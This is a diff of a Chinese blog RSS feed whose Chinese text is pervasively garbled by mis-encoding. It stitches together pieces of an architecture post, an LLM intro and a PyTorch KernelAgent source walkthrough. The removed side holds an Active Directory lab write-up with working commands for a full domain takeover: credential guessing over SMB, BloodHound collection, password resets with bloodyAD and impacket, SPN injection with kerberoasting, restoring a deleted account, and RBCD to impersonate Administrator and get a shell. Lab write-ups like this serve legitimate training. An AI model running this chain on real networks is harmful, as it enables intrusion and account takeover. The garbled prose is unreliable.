+<p>ãããã<strong>æå¾é©±å¨æ¶æ</strong>ï¼ç¨èªç¶è¯­è¨æè¿°ç³»ç»éæ±ï¼"æè¦ 5 ä¸ªè®¢åæå¡å®ä¾ï¼è·¨ 3 ä¸ªå¯ç¨åº"ï¼ï¼AI èªå¨çæ Terraform/K8S éç½®ãåºç¡è®¾æ½å³ä»£ç æ­£å¨åæåºç¡è®¾æ½å³å¯¹è¯ã</p>
+<p>ãããã<strong>ç»¿è²å¯é æ§</strong>ï¼å¨ä¿è¯æ§è½çåæä¸ï¼ä¼åèµæºå©ç¨çåç¢³æçãå«è®©ä½ ç K8S éç¾¤å¨åå¤ç©ºè½¬ã</p>
+<p>&nbsp;</p>
+<p>ãããã<strong>æ»ç»ä¸å¥è¯ï¼æ¶æä¸æ¯è®¾è®¡åºæ¥çï¼æ¯æµéé¼åºæ¥çãæ¯ä¸å±é½æä¸ä¸ªæ¾ç»è¢«æè¶´ä¸çç¨åºåãä½ ç°å¨éå°çé®é¢ï¼åäººé½éå°è¿äºââä»ä»¬çè§£å³æ¹æ¡ï¼å°±æ¯ä»å¤©é£äº"é«å¤§ä¸"çåè¯ãä½è¯·è®°ä½ï¼å«è¶åæ¶è´¹æ¶æãä½ çå¢éå¤å¤§ãä½ çæµéå¤å¤§ï¼ä½ çæ¶æå°±è¯¥å¤å¤æãå¤ä¸å±å°±å¤ä¸å±ç»´æ¤ææ¬ãåéï¼æ¯çé¼æ´éè¦ã</strong></p>
+<p>ããåå®¢åºèªï¼<a href="https://www.cnblogs.com/w5942066/" target="_blank">https://www.cnblogs.com/w5942066/</a></p>
+
+</div>
+<div id="MySignature" role="contentinfo">
+    <p style="font-size: 14px; color: #F00">çæå£°æï¼æ¬æä¸º<b> é­æ¨æ¨ </b>ååæç« å¹¶åå¸å°åå®¢å­ï¼ é¤äº<a style="text-decoration:none;" href="http://www.10qianwan.com/articledetail/592163.html" target="_blank"><span style="color:#2196f3;">ãè¬ä»ç½ã</span></a>å¤ï¼ å¶ä»å¹³å°æ¬¢è¿è½¬è½½ï¼<strong>ä½å¿é¡»å¨æç« é¡µé¢ææ¾ä½ç½®åæä½èååºå¤</strong>ï¼éå¸¸æè°¢ãææ¯äº¤æµQQç¾¤  99210270 
+<a target="_blank" href="//shang.qq.com/wpa/qunwpa?idkey=fe90afa055b9ed461c72ed559efdb812afa5d630b11574ffc7dc84dcbda77652"><img border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="ITè½¯ä»¶ææ¯äº¤æµ" title="ITè½¯ä»¶ææ¯äº¤æµ"></a></p>
+<p>å¾®ä¿¡æ«ä¸æ«å³æ³¨æå¬ä¼å·</p>
+<p>ä¸èµ·å­¦ä¹ ï¼ä¸èµ·è¿æ­¥</p>
+<p style=""><img style="width:200px;height:200px" src="https://images.cnblogs.com/cnblogs_com/w5942066/1611708/o_200305050859qrcode_for_gh_ba172d530259_430%20(2).jpg" alt=""></p>
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-23 16:13">2026-05-23 16:13</span>&nbsp;
+<a href="https://www.cnblogs.com/w5942066">é­æ¨æ¨</a>&nbsp;
+éè¯»(<span id="post_view_count">177</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(20134970);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fw5942066%2Fp%2F20134970&amp;targetId=20134970&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
 </div>
          ]]>
     </description>
@@ -1906,7 +2359,7 @@ pnpm run dev
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-05-22 22:26">2026-05-22 22:25</span>&nbsp;
 <a href="https://www.cnblogs.com/w5942066">é­æ¨æ¨</a>&nbsp;
-éè¯»(<span id="post_view_count">492</span>)&nbsp;
+éè¯»(<span id="post_view_count">644</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20126166);return false;">æ¶è</a>&nbsp;
@@ -1916,14 +2369,14 @@ pnpm run dev
     </description>
     </item>
 <item>
-    <title><![CDATA[ ç½ç»å®å¨å¨çº¿å°±è½æçåç½é¶åºæ¨è & Dawn Breaker ååé¶åº WP ]]></title>
-    <link>https://www.cnblogs.com/mhtsec/p/20125121</link>
-    <guid>e44cbfecf823d3a10615685fb8d4fa2c</guid>
+    <title><![CDATA[ å®æ´å­¦ä¹ LLM(äº):å¤§æ¨¡åå°åºæ¯ä»ä¹ ]]></title>
+    <link>https://www.cnblogs.com/FatTiger4399/p/20143823</link>
+    <guid>20f7f646bac2e0c0263016a2c8b8a00e</guid>
     <description>
     <![CDATA[ 
             <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/mhtsec/p/20125121" title="åå¸äº 2026-05-22 20:36">
-    <span role="heading" aria-level="2">ç½ç»å®å¨å¨çº¿å°±è½æçåç½é¶åºæ¨è &amp; Dawn Breaker ååé¶åº WP</span>
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/FatTiger4399/p/20143823" title="åå¸äº 2026-05-24 18:23">
+    <span role="heading" aria-level="2">å®æ´å­¦ä¹ LLM(äº):å¤§æ¨¡åå°åºæ¯ä»ä¹</span>
     
 
 </a>
@@ -1931,1002 +2384,289 @@ pnpm run dev
             </h1>
             <div class="clear"></div>
             <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<p>é¶åºé¾æ¥ï¼<br>
-æ å¢çç®æ ï¼æ¯æä¸ºç½å®äººå¿å¤çé¶åºï¼æ å¢ä¸ç´å¨æç»­ä¸æ¶é¶åºç¯å¢ï¼æ¶µçäºç½ç»å®å¨ ææ¯æ¹åçåä¸ªåç±»ï¼å¨çº¿åç½é¶åºãwebé¶åºãcveå¤ç°ãSRCåºæ¯åºæå°½æã</p>
-<p><a href="https://bdziyi.com/ulab/lab.html?page=target-detail&amp;id=152" target="_blank" rel="noopener nofollow">https://bdziyi.com/ulab/lab.html?page=target-detail&amp;id=152</a></p>
-<h1 id="dawn-breaker">Dawn Breaker</h1>
-<h2 id="ä¿¡æ¯æ¶é">ä¿¡æ¯æ¶é</h2>
-<h3 id="smb-welcome-å¯è¯»">SMB Welcome å¯è¯»</h3>
-<pre><code class="language-bash">nxc smb 192.168.111.10 -u '' -p ' ' --shares
-</code></pre>
-<p><img alt="image-20260127155759208" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150540.png" class="lazyload"></p>
-<h3 id="è¯»å-lettertxt-æä»¶">è¯»å Letter.txt æä»¶</h3>
-<p><img alt="image-20260127155929312" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150542.png" class="lazyload"></p>
-<p><img alt="image-20260127155946791" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150543.png" class="lazyload"></p>
-<p>å°è¿ä¸ªä¿¡æ¯ä½ä¸ºç¨æ·ååå¯ç è¿è¡å°è¯</p>
-<pre><code class="language-bash">nxc smb 192.168.111.10 -u 'Yangyang' -p 'Hello' --shares
-</code></pre>
-<p><img alt="image-20260127160035430" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150544.png" class="lazyload"></p>
-<h3 id="ä½¿ç¨-bloodhound-python-è¿è¡ä¿¡æ¯æ¶é">ä½¿ç¨ bloodhound-python è¿è¡ä¿¡æ¯æ¶é</h3>
-<pre><code class="language-bash">bloodhound-python -c All -u 'Yangyang' -p 'Hello' -ns 192.168.111.10 -d sec.lab -dc ad.sec.lab --zip --dns-tcp
-</code></pre>
-<p><img alt="image-20260127160552931" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150545.png" class="lazyload"></p>
-<p>ä½æ¯çº¿è·¯å°äº LAHAYO@SEC.LAB å°±æ­å¼äºï¼æ¥çååææ¯å¦æè·¯çº¿å°è¾¾åæ§æèåç®¡çåï¼çå°æä¸ä¸ªæªç¥çèç¹å¯ä»¥RBCDå°åæ§</p>
-<p><img alt="image-20260127160819071" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150546.png" class="lazyload"></p>
-<h3 id="ç¬¬äºæ¡çº¿è·¯">ç¬¬äºæ¡çº¿è·¯</h3>
-<p><img alt="image-20260127161005143" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150547.png" class="lazyload"></p>
-<p>ç»è¿åæåç° Rover è¿ä¸ªè´¦æ·å¾ç¹æ®ï¼å®å³èçä¸ä¸ªè®¡ç®æºè´¦æ·ï¼SOLARIS@SEC.LAB å¯ä»¥éç½®å®çå¯ç ï¼ä½æ¯ç°å¨è¿æ²¡æ SOLARIS@SEC.LAB ç¸å³çä¿¡æ¯</p>
-<p><img alt="image-20260127161127087" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150548.png" class="lazyload"></p>
-<p><img alt="image-20260127161243989" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150549.png" class="lazyload"></p>
-<p>å¨ç®åè¿ä¸ªæåµä¸æ³è¦è·åå° SOLARIS@SEC.LAB æä¸¤ä¸ªæ¹æ³å¯ä»¥å°è¯ï¼</p>
-<ol>
-<li>Pre-Created Computer Account</li>
-<li>Timeroasting</li>
-</ol>
-<h2 id="è·å-solarisseclab-çæ§å¶æ">è·å SOLARIS@SEC.LAB çæ§å¶æ</h2>
-<p>åç° SOLARIS@SEC.LAB å¶å®æ¯ <code>Pre-Created Computer Account</code>ï¼å©ç¨ä¹åçåè´¦æ·å°±è½è·åå°å¶ Kerberos å­æ®ï¼å¦å¤ <code>Pre-Created Computer Account</code> çå¯ç ä¸è´¦æ·åå¨å°åä¸æ ·</p>
-<p><img alt="image-20260127161805204" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150550.png" class="lazyload"></p>
-<p><img alt="image-20260127162125299" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150551.png" class="lazyload"></p>
-<h3 id="éç½®-solarisseclab-èªèº«å¯ç ">éç½® SOLARIS@SEC.LAB èªèº«å¯ç </h3>
-<pre><code class="language-bash">impacket-changepasswd -altuser 'SOLARIS$' -altpass 'solaris' -newpass '123456' -reset 'sec.lab/SOLARIS$'@ad.sec.lab -k -dc-ip 192.168.111.10
-</code></pre>
-<p><img alt="image-20260127143528970" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150552.png" class="lazyload"></p>
-<h2 id="è·å-rover-åç¨æ·çæ§å¶æ">è·å Rover åç¨æ·çæ§å¶æ</h2>
-<h3 id="éç½®-rover-çå¯ç ">éç½® Rover çå¯ç </h3>
-<pre><code class="language-bash">bloodyAD -u 'Solaris$' -p '123456' -d sec.lab --host 192.168.111.10 set password Rover 123456
-</code></pre>
-<p><img alt="image-20260127162301651" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150554.png" class="lazyload"></p>
-<p>éªè¯è´¦æ·ä¸æåï¼æ ¹æ®æ¥éæ¥å¤æ­è´¦æ·è¿æ²¡å¯ç¨</p>
-<p><img alt="image-20260127162417942" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150555.png" class="lazyload"></p>
-<h3 id="å¯ç¨-rover-è´¦æ·">å¯ç¨ Rover è´¦æ·</h3>
-<pre><code class="language-bash">bloodyAD -u 'Solaris$' -p '123456' -d sec.lab --host 192.168.111.10 remove uac Rover -f ACCOUNTDISABLE
-</code></pre>
-<p><img alt="image-20260127162448345" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150556.png" class="lazyload"></p>
-<h2 id="jinzhou-å®å¨ç»">Jinzhou å®å¨ç»</h2>
-<h3 id="addself">AddSelf</h3>
-<p>Rover ç¨æ·æ¯å¯ä»¥å°èªèº«å å¥ Jinzhou@SEC.LAB</p>
-<pre><code class="language-bash">bloodyAD -u Rover -p 123456 --host 192.168.111.10 -d sec.lab add groupMember Jinzhou Rover
-</code></pre>
-<p><img alt="image-20260127162613183" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150557.png" class="lazyload"></p>
-<p><img alt="image-20260127162715025" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150558.png" class="lazyload"></p>
-<h3 id="addspn">AddSPN</h3>
-<p><img alt="image-20260127162811490" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150559.png" class="lazyload"></p>
-<p>æ ¹æ®ACLå¯ä»¥éè¿ç»å¾ä¸åä¸ªç¨æ·æ·»å  <code>servicePrincipalName</code> æ¥è¾¾å°å©ç¨ <code>kerberoasting</code> ç ´è§£å¯ç </p>
-<pre><code class="language-bash">bloodyAD -u 'Rover' -p '123456' -d sec.lab --host 192.168.111.10 set object Jinxi servicePrincipalName -v 'http/web'
-</code></pre>
-<p><img alt="image-20260127163010676" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150560.png" class="lazyload"></p>
-<pre><code class="language-bash">nxc ldap 192.168.111.10 -u 'Rover' -p '123456' --kerberoasting KERBEROASTING
-</code></pre>
-<p><img alt="image-20260127163036447" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150561.png" class="lazyload"></p>
-<pre><code class="language-bash">hashcat KERBEROASTING /usr/share/wordlists/rockyou.txt
-</code></pre>
-<p><img alt="image-20260127163120546" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150562.png" class="lazyload"></p>
-<h2 id="black-shores-å®å¨ç»">Black Shores å®å¨ç»</h2>
-<h3 id="addmember">AddMember</h3>
-<p><img alt="image-20260127163215281" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150563.png" class="lazyload"></p>
-<p>æ ¹æ® JINXI@SEC.LAB çACLï¼å° Rover å å¥ Black ShoresI@SEC.LAB</p>
-<pre><code class="language-bash">bloodyAD -u 'Jinxi' -p 'Jinxin' --host ad -d sec.lab add groupMember 'Black Shores' Rover
-</code></pre>
-<p><img alt="image-20260127163330106" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150564.png" class="lazyload"></p>
-<h3 id="writeowner">WriteOwner</h3>
-<p><img alt="image-20260127163408351" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150565.png" class="lazyload"></p>
-<p>æ ¹æ®ACLï¼Black ShoresI@SEC.LAB å¯¹ TheShorekeeper æ WriteOwner æé</p>
-<p><strong>PSï¼TheShorekeeper ç¨æ·æ¯ç¦ç¨ç¶æï¼å¯ä»¥ä½¿ç¨ nxc æè æ¥è¯¢ userAccountControl å±æ§æ¥éªè¯ï¼è¿éå°±ç¥è¿äº</strong></p>
-<pre><code class="language-bash">bloodyAD -u 'Rover' -p '123456' --host ad -d sec.lab set owner TheShorekeeper Rover
-
-bloodyAD -u 'Rover' -p '123456' --host ad -d sec.lab add genericAll TheShorekeeper Rover
-
-bloodyAD -u 'Rover' -p '123456' --host ad -d sec.lab set password TheShorekeeper 123456
-
-bloodyAD -u 'Rover' -p '123456' -d sec.lab --host 192.168.111.10 remove uac TheShorekeeper -f ACCOUNTDISABLE
-</code></pre>
-<p><img alt="image-20260127163600093" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150566.png" class="lazyload"></p>
-<h2 id="lahayo-å®å¨ç»">Lahayo å®å¨ç»</h2>
-<h3 id="addmember-1">AddMember</h3>
-<p><img alt="image-20260127163736789" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150567.png" class="lazyload"></p>
-<pre><code class="language-bash">bloodyAD -u 'TheShorekeeper' -p '123456' -d sec.lab --host 192.168.111.10 add groupMember Lahayo Rover
-</code></pre>
-<p><img alt="image-20260127163809083" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150568.png" class="lazyload"></p>
-<p>æ¥ä¸æ¥å°±åå°ä¸é¢ä¿¡æ¯æ¶éé¨ååæçè·¯å¾ï¼å°è¿éå°±æ­å¼äºï¼<strong>æ³¨æ</strong>ï¼</p>
-<ol>
-<li>å¶å®è¿ä¸ªåºæ¯ä¸æ­¢ä¸¤æ¡è·¯å¾å°è¾¾æåçåæ§</li>
-<li>ä¸å¾è¿ä¸ªèç¹å°åºæ¯ä»ä¹ï¼å®å¯ä»¥ RBCD å°åæ§</li>
-</ol>
-<p><img alt="image-20260127164142496" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150569.png" class="lazyload"></p>
-<ol start="3">
-<li>ç®åçè·¯å¾æ æ³è·åä¸é¢çç¨æ·æé</li>
-</ol>
-<p><img alt="image-20260127164057056" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150570.png" class="lazyload"></p>
-<h2 id="active-directory---recycle-bin">Active Directory - Recycle Bin</h2>
-<p><strong>Active Directory åæ¶ç«</strong> æ¯ Windows Server çä¸é¡¹åè½ï¼åè®¸å¨ä¸ä»å¤ä»½è¿åçæåµä¸ï¼å®æ´æ¢å¤è¯¯å ç AD å¯¹è±¡ã</p>
-<hr>
-<h3 id="æ ¸å¿ç¹æ§">æ ¸å¿ç¹æ§</h3>
-<ul>
-<li><strong>å®æ´æ¢å¤</strong>ï¼æ¢å¤å¯¹è±¡çææå±æ§ï¼å¦ SIDãç»æéãå¯ç ï¼ã</li>
-<li><strong>çå½å¨æ</strong>ï¼
-<ol>
-<li><strong>å·²å é¤ç¶æ (Deleted)</strong>ï¼å¯¹è±¡ç§»å¥åæ¶ç«ï¼ä¿çææå±æ§ã</li>
-<li><strong>å·²åæ¶ç¶æ (Recycled)</strong>ï¼è¶è¿âå·²å é¤å¯¹è±¡çå­æâåï¼å±æ§è¢«å¥ç¦»ï¼ä¸å¯ç®åæ¢å¤ã</li>
-</ol>
-</li>
-<li><strong>é»è®¤ç¶æ</strong>ï¼Windows Server 2008 R2 å¼å¥ï¼é»è®¤<strong>ç¦ç¨</strong>ï¼éæå¨å¼å¯ä¸ä¸å¯éã</li>
-</ul>
-<hr>
-<h3 id="æ¢å¤æ¹å¼">æ¢å¤æ¹å¼</h3>
-<ol>
-<li><strong>å¾å½¢çé¢</strong>ï¼éè¿ <code>AD ç®¡çä¸­å¿ (ADAC)</code> ç "Deleted Objects" å®¹å¨ã</li>
-<li><strong>å½ä»¤è¡</strong>ï¼ä½¿ç¨ PowerShell å½ä»¤ <code>Restore-ADObject</code>ã</li>
-</ol>
-<h3 id="æ¥è¯¢æ¯å¦æç¨æ·å¯¹-deleted-objects-ææé">æ¥è¯¢æ¯å¦æç¨æ·å¯¹ "Deleted Objects" ææé</h3>
-<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 get writable
-</code></pre>
-<p><img alt="image-20260127164507287" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150571.png" class="lazyload"></p>
-<p>è¿åç°äºä¸ä¸ªå é¤ç¶æçç¨æ·</p>
-<p><img alt="image-20260127164537834" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150572.png" class="lazyload"></p>
-<h3 id="æ¥è¯¢å·²å é¤ç¨æ·çä¿¡æ¯">æ¥è¯¢å·²å é¤ç¨æ·çä¿¡æ¯</h3>
-<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 get search -c '1.2.840.113556.1.4.2064' --filter '(isDeleted=TRUE)' --attr name,objectSid
-</code></pre>
-<p><img alt="image-20260127164606961" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150573.png" class="lazyload"></p>
-<p>Lynae ç¨æ·ç objectSid åå¥½å¯¹äºä¸äºæªç¥èç¹çSID</p>
-<p><img alt="image-20260127164142496" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150569.png" class="lazyload"></p>
-<h3 id="æ¢å¤å·²å é¤ç¨æ·">æ¢å¤å·²å é¤ç¨æ·</h3>
-<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 set restore Lynae
-</code></pre>
-<p><img alt="image-20260127164640735" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150574.png" class="lazyload"></p>
-<h3 id="éç½®å·²å é¤ç¨æ·çå¯ç åå¯ç¨ç¨æ·">éç½®å·²å é¤ç¨æ·çå¯ç åå¯ç¨ç¨æ·</h3>
-<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 set password Lynae '123456'
-
-bloodyAD -u 'Rover' -p '123456' -d sec.lab --host 192.168.111.10 remove uac Lynae -f ACCOUNTDISABLE
-</code></pre>
-<p><img alt="image-20260127164731312" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150575.png" class="lazyload"></p>
-<h3 id="æ³¨æ">æ³¨æï¼ï¼ï¼</h3>
-<p>å¦æåºç°è¯¥æ¥éï¼è¯´æè¯¥ç¨æ·å¯¹å·²å é¤å¯¹è±¡ä¸å­å¨ LIST | READ æéï¼WP ä¸­åæ Rover ç¨æ·å å¥äº Lahayo å®å¨ç»ï¼bloodhound ä¸­æ²¡æå®ç°å¯¹è¯¥ ACL çåæï¼éè¦èªå·±æå¨åæ</p>
-<p><img alt="image-20260127165012339" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150576.png" class="lazyload"></p>
-<h3 id="rbcd">RBCD</h3>
-<pre><code class="language-bash">bloodyAD -u 'Lynae' -p '123456' -d sec.lab --host 192.168.111.10 add computer Web 123456
-
-bloodyAD -u 'Lynae' -p '123456' -d sec.lab --host 192.168.111.10 add rbcd 'AD$' 'Web$'
-</code></pre>
-<p><img alt="image-20260127165216752" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150577.png" class="lazyload"></p>
-<pre><code class="language-bash">impacket-getST -spn 'CIFS/AD' -impersonate 'Administrator' 'sec.lab/Web$:123456' -k -dc-ip 192.168.111.10
-
-export KRB5CCNAME=Administrator@CIFS_AD@SEC.LAB.ccache
-
-impacket-wmiexec -k -no-pass AD -dc-ip 192.168.111.10 -codec gbk
-</code></pre>
-<p><img alt="image-20260127165521643" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150228.png" class="lazyload"></p>
-
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-22 20:37">2026-05-22 20:36</span>&nbsp;
-<a href="https://www.cnblogs.com/mhtsec">å¬ä¼å·æ£è±ç³fans</a>&nbsp;
-éè¯»(<span id="post_view_count">70</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20125121);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fmhtsec%2Fp%2F20125121&amp;targetId=20125121&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ PyTorch KernelAgent æºç è§£è¯» ---ï¼6ï¼--- Composer ]]></title>
-    <link>https://www.cnblogs.com/rossiXYZ/p/20124922</link>
-    <guid>13d5c6a26c26f901abe95d57d6e658cf</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/rossiXYZ/p/20124922" title="åå¸äº 2026-05-22 20:02">
-    <span role="heading" aria-level="2">PyTorch KernelAgent æºç è§£è¯» ---ï¼6ï¼--- Composer</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h1 id="pytorch-kernelagent-æºç è§£è¯»----6----composer">PyTorch KernelAgent æºç è§£è¯» ---ï¼6ï¼--- Composer</h1>
-<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#pytorch-kernelagent-æºç è§£è¯»----6----composer" rel="noopener nofollow">PyTorch KernelAgent æºç è§£è¯» ---ï¼6ï¼--- Composer</a><ul><li><a href="#0x00-æ¦è¦" rel="noopener nofollow">0x00 æ¦è¦</a></li><li><a href="#0x01-æ ¸å¿åè½" rel="noopener nofollow">0x01 æ ¸å¿åè½</a><ul><li><a href="#11-æ ¸å¿ä½ç¨" rel="noopener nofollow">1.1 æ ¸å¿ä½ç¨</a></li><li><a href="#12-æ ¸å¿ç¹è²" rel="noopener nofollow">1.2 æ ¸å¿ç¹è²</a></li><li><a href="#13-æµç¨å¾" rel="noopener nofollow">1.3 æµç¨å¾</a><ul><li><a href="#æ ¸å¿é»è¾å³ç³»å¾" rel="noopener nofollow">æ ¸å¿é»è¾å³ç³»å¾</a></li><li><a href="#å®æ´æ§è¡æµç¨å¾" rel="noopener nofollow">å®æ´æ§è¡æµç¨å¾</a></li></ul></li></ul></li><li><a href="#0x02-è¯¦ç»åè½" rel="noopener nofollow">0x02 è¯¦ç»åè½</a><ul><li><a href="#21-ä½¿ç¨" rel="noopener nofollow">2.1 ä½¿ç¨</a></li><li><a href="#22-éè¯¯å¤çä¸è¿­ä»£" rel="noopener nofollow">2.2 éè¯¯å¤çä¸è¿­ä»£</a></li><li><a href="#23-_load_kernels_from_summary" rel="noopener nofollow">2.3 _load_kernels_from_summary</a></li><li><a href="#24-prompt" rel="noopener nofollow">2.4 Prompt</a><ul><li><a href="#æ ¸å¿ä½ç¨" rel="noopener nofollow">æ ¸å¿ä½ç¨</a></li><li><a href="#_build_composition_prompt-ä¸å±ç¹è²" rel="noopener nofollow">_build_composition_prompt ä¸å±ç¹è²</a></li><li><a href="#_build_refinement_prompt-ä¸å±ç¹è²" rel="noopener nofollow">_build_refinement_prompt ä¸å±ç¹è²</a></li><li><a href="#_summarize_subgraphs_for_prompt-ä¸å±ç¹è²" rel="noopener nofollow">_summarize_subgraphs_for_prompt ä¸å±ç¹è²</a></li><li><a href="#ååå·¥ä½å³ç³»" rel="noopener nofollow">ååå·¥ä½å³ç³»</a></li><li><a href="#ä»£ç " rel="noopener nofollow">ä»£ç </a></li></ul></li><li><a href="#25-ç»åçæ" rel="noopener nofollow">2.5 ç»åçæ</a><ul><li><a href="#_auto_patch_common_triton_issues-å½æ°" rel="noopener nofollow">_auto_patch_common_triton_issues å½æ°</a><ul><li><a href="#æ ¸å¿ä½ç¨-1" rel="noopener nofollow">æ ¸å¿ä½ç¨</a></li><li><a href="#æ ¸å¿ç¹è²" rel="noopener nofollow">æ ¸å¿ç¹è²</a></li></ul></li><li><a href="#compose-å½æ°" rel="noopener nofollow">compose å½æ°</a><ul><li><a href="#æ ¸å¿ä½ç¨-2" rel="noopener nofollow">æ ¸å¿ä½ç¨</a></li><li><a href="#æ ¸å¿ç¹è²-1" rel="noopener nofollow">æ ¸å¿ç¹è²</a></li></ul></li><li><a href="#ååå·¥ä½å³ç³»-1" rel="noopener nofollow">ååå·¥ä½å³ç³»</a></li><li><a href="#ä»£ç -1" rel="noopener nofollow">ä»£ç </a></li></ul></li></ul></li><li><a href="#0xff-åè" rel="noopener nofollow">0xFF åè</a></li></ul></li></ul></div><p></p>
-<h2 id="0x00-æ¦è¦">0x00 æ¦è¦</h2>
-<p>Fuser/compose_end_to_end.py æ¯ Fuser ç®¡éä¸­çæåä¸ä¸ªå³é®æ­¥éª¤ï¼å®å°åæ£çãéå¯¹ç¹å®å­å¾ä¼åç Triton åæ ¸æ ç¼å°æ´åæä¸ä¸ªåä¸çãé«æ§è½çç«¯å°ç«¯ Triton åæ ¸ï¼åæ¶ç¡®ä¿å¶åè½ä¸åå§ PyTorch å®ç°çæ°å¼ç­ä»·æ§ã</p>
-<p>Composerçæ¶æå¾å¦ä¸ï¼å¶åè½æ¦æ¬æ¯ä¸å¥è¯ï¼æææéªè¯éè¿çå­å¾åæ ¸+åé®é¢åç»LLMæ¼æåæä»¶ãä¹ä¼æéè¯¯æ¥å¿è®©LLMä¿®ï¼æå¤éè¯ max_itersè½®ï¼å¹¶èªå¨ patch å¸¸è§ Triton é·é±ã</p>
-<p><img alt="composer" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202605/1850883-20260522200112548-700962936.png" class="lazyload"></p>
-<h2 id="0x01-æ ¸å¿åè½">0x01 æ ¸å¿åè½</h2>
-<h3 id="11-æ ¸å¿ä½ç¨">1.1 æ ¸å¿ä½ç¨</h3>
-<p>Composerçæ ¸å¿åè½å¦ä¸ï¼</p>
-<ul>
-<li><strong>å­å¾åæ ¸æ´å</strong>ï¼å° Fuser æµç¨ä¸­æåçå­å¾åå¶å¯¹åºçãå·²éªè¯ç Triton åæ ¸ï¼éæ°ç»åä¸ºä¸ä¸ªç«¯å°ç«¯ç Triton å®ç°ï¼æ¿ä»£åå§ PyTorch ä»£ç çååä¼ æ­é»è¾ã</li>
-<li><strong>LLM é©±å¨çä»£ç çæ</strong>ï¼ä»¥åå§é®é¢ä»£ç ãå­å¾ä¿¡æ¯ãå­å¾ Triton åæ ¸ä¸ºè¾å¥ï¼éè¿å®å¶å Prompt è°ç¨ LLM çæå®æ´ç Triton åæ ¸ä»£ç ã</li>
-<li><strong>åè½éªè¯ä¸è¿­ä»£ä¼å</strong>ï¼æ¯æèªå¨éªè¯çæçåæ ¸ï¼å¯¹æ¯ PyTorch åèç»æï¼ï¼è¥éªè¯å¤±è´¥ååºäºéè¯¯ä¿¡æ¯è¿­ä»£è°ç¨ LLM ä¿®æ­£ä»£ç ï¼ç´å°éè¿éªè¯æè¾¾å°æå¤§è¿­ä»£æ¬¡æ°ã</li>
